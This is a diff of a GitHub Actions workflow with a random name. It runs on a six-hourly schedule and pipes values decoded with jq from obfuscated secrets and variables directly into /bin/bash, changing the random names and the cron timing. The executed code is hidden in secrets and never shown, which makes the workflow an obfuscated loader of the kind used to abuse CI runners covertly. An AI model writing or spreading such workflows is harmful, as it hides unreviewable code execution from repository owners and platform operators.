@@ -1,9 +1,9 @@
 name: bainende1234
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 0/6 * * *'
-
+    - cron: '19 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: bainende1234
         env:
-          qvac54: ${{ secrets.qvac54 }}
+          qmth904: ${{ secrets.qmth904 }}
         run: |
-          echo $qvac54 | jq -r .x2 | /bin/bash
-          echo $ye242 | jq -r .tbu528 | /bin/bash
-          echo $h5 | jq -r .tdmwb20496 | /bin/bash
-          echo $hyu52142 | jq -r .xsrg63 | /bin/bash
-          echo $fx321 | jq -r .lc770 | /bin/bash
-          echo $ujgpy3 | jq -r .py333 | /bin/bash
-          echo $bhsf912 | jq -r .fifg715 | /bin/bash
-          echo $fsom1364 | jq -r .o91 | /bin/bash
-          echo $sb3 | jq -r .amgoz00 | /bin/bash
-          echo $xys96 | jq -r .rxmu1205 | /bin/bash
-          echo $o5 | jq -r .sbt783 | /bin/bash
-          echo $s83136 | jq -r .kjrjn62862 | /bin/bash
-          echo $rdegh6 | jq -r .wjiz82 | /bin/bash
+          echo $qmth904 | jq -r .dzjaj23188 | /bin/bash
+          echo $paoms782 | jq -r .xnxi69 | /bin/bash
+          echo $j40 | jq -r .dyqj68 | /bin/bash
+          echo $vndza427 | jq -r .de24 | /bin/bash
+          echo $rrc42 | jq -r .jnd78 | /bin/bash
+          echo $bxii05263 | jq -r .krt05060 | /bin/bash
+          echo $qnzmz4181 | jq -r .q19 | /bin/bash
+          echo $ong065 | jq -r .sukjb0 | /bin/bash
+          echo $zlnm1 | jq -r .zk3273 | /bin/bash
+          echo $snkwh7 | jq -r .g7 | /bin/bash
+          echo $ucnfm5840 | jq -r .tnb40075 | /bin/bash
 
